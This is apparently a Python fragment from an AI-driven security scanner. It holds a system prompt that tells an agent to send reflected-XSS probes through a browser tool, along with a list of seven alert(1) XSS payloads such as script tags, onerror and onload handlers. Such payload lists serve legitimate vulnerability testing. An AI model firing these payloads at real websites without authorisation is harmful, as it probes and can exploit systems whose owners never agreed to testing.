XSS_SYSTEM_PROMPT = """
When testing for XSS, try multiple payloads (e.g., <script>alert(1)</script>, "><img src=x onerror=alert(1)>, etc.).
After each test, analyze the output for evidence of XSS (e.g., reflected payload, script execution).
If no vulnerability is found, try the next payload.
Continue until a vulnerability is found or all payloads are exhausted.
If the output indicates a vulnerability, report the vulnerability but do not stop.
Continue testing with the next payload.
If no vulnerability evidence is found, report that no vulnerability was found.
Examples:
Task: Test for reflected XSS on https://example.com/search?q=test.
Use WebBrowserTool: browse https://example.com/search?q=<script>alert(1)</script>
Task: Test for reflected XSS on https://example.com/search?q=test with payload '" onmouseover=alert(1) "'.
Use WebBrowserTool: browse https://example.com/search?q=" onmouseover=alert(1) "
"""

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onmouseover=alert(1) "',
    "'><img src=x onerror=alert(1)>",
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<math href="javascript:alert(1)">CLICK',
] 